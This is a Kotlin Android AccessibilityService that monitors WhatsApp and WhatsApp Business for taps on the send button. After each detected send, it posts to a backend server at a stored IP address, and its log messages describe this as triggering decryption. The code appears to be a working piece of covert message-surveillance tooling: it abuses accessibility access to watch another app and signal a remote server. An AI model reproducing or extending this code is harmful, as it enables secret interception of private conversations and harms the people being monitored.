package com.cuarzopolar.permission

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

private const val TAG = "WhatsAppMonitor"
private const val BACKEND_PORT = 3001
private const val COOLDOWN_MS = 3000L

class WhatsAppMonitorService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(3, TimeUnit.SECONDS)
        .readTimeout(3, TimeUnit.SECONDS)
        .build()

    private var lastTriggerMs = 0L

    override fun onServiceConnected() {
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            packageNames = arrayOf("com.whatsapp", "com.whatsapp.w4b")
            notificationTimeout = 100
        }
        Log.d(TAG, "Servicio conectado — monitorizando WhatsApp")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED) return

        val viewId = event.source?.viewIdResourceName ?: return
        if (!viewId.contains("send", ignoreCase = true)) return

        val now = System.currentTimeMillis()
        if (now - lastTriggerMs < COOLDOWN_MS) return
        lastTriggerMs = now

        Log.d(TAG, "Botón enviar detectado ($viewId) — disparando descifrado")
        triggerDecrypt()
    }

    override fun onInterrupt() {}

    private fun triggerDecrypt() {
        val ip = getSharedPreferences("permission_prefs", Context.MODE_PRIVATE)
            .getString("last_ip", null) ?: run {
                Log.w(TAG, "IP del backend desconocida — trigger ignorado")
                return
            }

        val url = "http://$ip:$BACKEND_PORT/api/whatsapp/trigger"
        val body = "{}".toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url(url).post(body).build()

        Thread {
            try {
                http.newCall(request).execute().use { resp ->
                    Log.d(TAG, "Trigger enviado — respuesta: ${resp.code}")
                }
            } catch (e: IOException) {
                Log.w(TAG, "Error enviando trigger: ${e.message}")
            }
        }.start()
    }
}
